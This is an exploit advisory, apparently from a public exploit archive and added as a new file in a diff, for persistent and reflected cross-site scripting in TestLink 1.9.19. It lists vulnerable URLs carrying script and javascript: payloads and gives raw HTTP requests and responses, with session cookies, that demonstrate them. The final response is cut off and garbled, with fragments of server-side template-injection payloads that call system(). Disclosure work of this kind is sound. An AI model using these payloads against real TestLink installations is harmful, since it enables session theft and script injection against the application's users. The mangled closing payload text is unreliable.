@@ -1,0 +1,145 @@
+# Exploit Title: TestLink 1.9.19 - Persistent Cross-Site Scripting
+# Date: 2019-11-20
+# Exploit Author: Milad Khoshdel
+# Software Link: http://testlink.org/
+# Version: TestLink 1.9.19
+# Tested on: Linux Apache/2 PHP/7.3.11
+
+
+=========
+Vulnerable Pages:
+=========
+
+Persistent --> https://[TestLink-URL]/testlink/lib/testcases/archiveData.php?add_relation_feedback_msg=Test%20Case%20with%20external%20ID%3A%20%20-%20does%20not%20exist&edit=%3cscRipt%3ealert(0x008B19)%3c%2fscRipt%3e&id=4&show_mode=show&version_id=3
+Non-Persistent --> https://[TestLink-URL]/testlink/index.php?caller=login&reqURI=javascript%3aalert(0x002082)&viewer=3
+Non-Persistent --> https://[TestLink-URL]/testlink/lib/testcases/tcEdit.php?doAction=doDeleteStep&nsextt=%3cscRipt%3ealert(0x00A5CA)%3c%2fscRipt%3e&show_mode=editDisabled&step_id=
+Non-Persistent --> https://[TestLink-URL]/testlink/lib/testcases/tcEdit.php?doAction=doDeleteStep&%3cscRipt%3ealert(0x00A5CE)%3c%2fscRipt%3e=nsextt&show_mode=editDisabled
+Non-Persistent --> https://[TestLink-URL]/testlink/lib/testcases/tcEdit.php?doAction=doDeleteStep&show_mode=%3cscRipt%3ealert(0x00A54D)%3c%2fscRipt%3e&step_id=
+
+
+=========
+POC:
+=========
+
+REGUEST -->
+
+GET /testlink/index.php?caller=login&reqURI=javascript%3aalert(0x002082)&viewer=3 HTTP/1.1
+Host: 127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us,en;q=0.5
+Cache-Control: no-cache
+Connection: Keep-Alive
+Cookie: PHPSESSID=7sjusfplttil0vsrv31ll2on2v; TESTLINK197TL_execSetResults_bn_view_status=0; TESTLINK197TL_execSetResults_platform_notes_view_status=0; TESTLINK197TL_execSetResults_tpn_view_status=0; TL_lastTestProjectForUserID_2=1; TESTLINK197TL_lastTestPlanForUserID_1=2; TESTLINK197TL_user2_proj1_testPlanId=2; TESTLINK_USER_AUTH_COOKIE=09d24c73361bc02964e80077a0b797b6fc2c1afb74c52ceea74c63311365fadd
+Referer: http://127.0.0.1/testlink/login.php?viewer=3
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+
+
+RESPONSE -->
+
+HTTP/1.1 200 OK
+Server: Apache
+Content-Length: 526
+X-Powered-By: PHP/7.3.11
+Pragma: no-cache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=5, max=50
+X-Frame-Options: SAMEORIGIN
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Content-Encoding: 
+Date: Wed, 20 Nov 2019 11:29:45 GMT
+Vary: Cookie,Accept-Encoding
+Cache-Control: no-store, no-cache, must-revalidate
+
+<!DOCTYPE html>
+
+<head>
+ <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+ <meta http-equiv="Content-language" content="en" />
+ <meta name="generator" content="testlink" />
+ <meta name="author" content="TestLink Development Team" />
+ <meta name="copyright" content="TestLink Development Team" />
+ <meta name="robots" content="NOFOLLOW" />
+ <title>TestLink 1.9.19</title>
+ <meta name="description" content="TestLink - TestLink ::: Main Page" />
+ <link rel="icon" href="http://127.0.0.1/testlink/gui/themes/default/images/favicon.ico" type="image/x-icon" />
+</head>
+
+
+<frameset rows="70,*" frameborder="0" framespacing="0">
+ <frame src="lib/general/navBar.php?tproject_id=0&tplan_id=0&updateMainPage=1" name="titlebar" scrolling="no" noresize="noresize" />
+ <frame src="javascript:alert(0x002082)" scrolling='auto' name='mainframe' />
+ <noframes>
+  <body>
+   TestLink required a frames supporting browser.
+  </body>
+ </noframes>
+</frameset>
+
+
+-------------------------------------------------
+
+STEP 1 -->
+
+[Request]
+GET /testlink/lib/testcases/archiveData.php?add_relation_feedback_msg=Test%20Case%20with%20external%20ID%3A%20%20-%20does%20not%20exist&edit=%3cscRipt%3ealert(0x008B19)%3c%2fscRipt%3e&id=4&show_mode=show&version_id=3 HTTP/1.1
+Host: 127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us,en;q=0.5
+Cache-Control: no-cache
+Connection: Keep-Alive
+Cookie: PHPSESSID=7sjusfplttil0vsrv31ll2on2v; TESTLINK197TL_execSetResults_bn_view_status=0; TESTLINK197TL_execSetResults_platform_notes_view_status=0; TESTLINK197TL_execSetResults_tpn_view_status=0; TESTLINK197ys-tproject_1_ext-comp-1001=a%3As%253A%2F1%2F3; TESTLINK_USER_AUTH_COOKIE=09d24c73361bc02964e80077a0b797b6fc2c1afb74c52ceea74c63311365fadd; TESTLINK197TL_user2_proj1_testPlanId=2; TESTLINK197TL_lastTestPlanForUserID_1=2; TL_lastTestProjectForUserID_2=1
+Referer: http://127.0.0.1/testlink/lib/testcases/tcEdit.php
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+
+
+[Response]
+HTTP/1.1 200 OK
+Server: Apache
+Content-Length: 0
+X-Powered-By: PHP/7.3.11
+Pragma: no-cache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=5, max=47
+X-Frame-Options: SAMEORIGIN
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 20 Nov 2019 11:59:45 GMT
+Vary: Cookie
+Cache-Control: no-store, no-cache, must-revalidate
+
+STEP 2 -->
+
+[Request]
+GET /testlink/lib/testcases/archiveData.php?add_relation_feedback_msg=Test%20Case%20with%20external%20ID%3A%20%20-%20does%20not%20exist&edit=testcase&id=127.0.0.1/trace.axd&show_mode=show&version_id=3 HTTP/1.1
+Host: 127.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-us,en;q=0.5
+Cache-Control: no-cache
+Connection: Keep-Alive
+Cookie: PHPSESSID=7sjusfplttil0vsrv31ll2on2v; TESTLINK197TL_execSetResults_bn_view_status=0; TESTLINK197TL_execSetResults_platform_notes_view_status=0; TESTLINK197TL_execSetResults_tpn_view_status=0; TESTLINK197ys-tproject_1_ext-comp-1001=a%3As%253A%2F1%2F3; TESTLINK_USER_AUTH_COOKIE=09d24c73361bc02964e80077a0b797b6fc2c1afb74c52ceea74c63311365fadd; TESTLINK197TL_user2_proj1_testPlanId=2; TL_lastTestProjectForUserID_2=1; TESTLINK197TL_lastTestPlanForUserID_1=2
+Referer: http://127.0.0.1/testlink/lib/testcases/tcEdit.php
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
+
+
+[Response]
+#Identification Page
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Server: Apache
+X-Powered-By: PHP/7.3.11
+Pragma: no-cache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=5, max=98
+X-Frame-Options: SAMEORIGIN
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+Content-Encoding: 
+Date: Wed, 20 Nov 2019 12:02:38 GMT
+Vary: Cookie,Accept-Encoding
+Cache-Control: no-store, no-cache, must-revalidate
+
+ner_title_{php}Smarty_Resource::parseResourceName(system("ns,[container_title_<scRipt>alert(0x008B19)</scRipt>] => container_title_<scRipt>alert(0x008B19)</scRipt>,[container_title_{{_self.env.registerUndefinedFilterCallback("sys
